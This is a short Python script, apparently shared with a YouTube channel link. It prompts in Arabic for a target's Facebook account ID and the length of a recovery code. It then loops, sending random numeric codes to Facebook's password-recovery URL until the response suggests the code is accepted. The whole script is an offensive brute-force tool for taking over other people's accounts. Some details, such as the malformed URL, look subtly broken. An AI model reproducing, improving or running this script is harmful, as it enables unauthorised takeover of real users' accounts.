		


import requests as r
import random as rak
import os
import time
import re as e
time.sleep(0.001)
os.system('clear')
print('''\033[1;32m
            .M         M.  
           .MMMMMMMMMMMMM.
          .MMM\MMMMMMM/MMM.       
         .MMM.7MMMMMMM.7MMM.    
        .MMMMMMMMMMMMMMMMMMM           
        MMMMMMM.......MMMMMMM        
        MMMMMMMMMMMMMMMMMMMMM  
''')
print('''\033[0;91m
   _    _     _     __  __ ___ _   _ ____  
   / \  | |   | |   |  \/  |_ _| \ | / ___| 
  / _ \ | |   | |   | |\/| || ||  \| \___ \ 
 / ___ \| |___| |___| |  | || || |\  |___) |
/_/   \_\_____|_____|_|  |_|___|_| \_|____/ 
''')
print('''\0330;33m
------------------------[~~~~~~~unknown💀️~~~~~~~~]-------------------                                         

YOUTUBE :https://www.youtube.com/@user-rm4zx2ct2b/featured

------------------------[~~~~~~~~unknown☠️~~~~~~~]-----------------------
''')

print('')
id = input('\033[1;90mادخل ايدي الحساب المطلوب اختراقة💀️: ')
sms = int(input('ادخل الرقم المكون لرمز الاستعادة '))
k =1
while True:
	pas = '123456789'
	pn = str("".join(rak.choice(pas)for p in range(sms)))
	web = r.get(f'https://m.facebook.com/recover/password/?u={id}&n={pn}c=%2Flogin%2F%3Frefsrc%3Ddeprecated&fl=default_recover&sih=0&msgr=0&_rdr',).text
	halo = e.search(pn,web)
	um = e.search('إعادة المحاولة',web)
	tr = e.search('الرابط الذي استخدمته غير صالح',web)
	if halo != None and um == None and tr == None:
				print(f'\033[1;32mCOD ☆~~> : {pn}')
				break
	else:
		print(f'\033[1;31mERROR : {pn}')
		k +=1
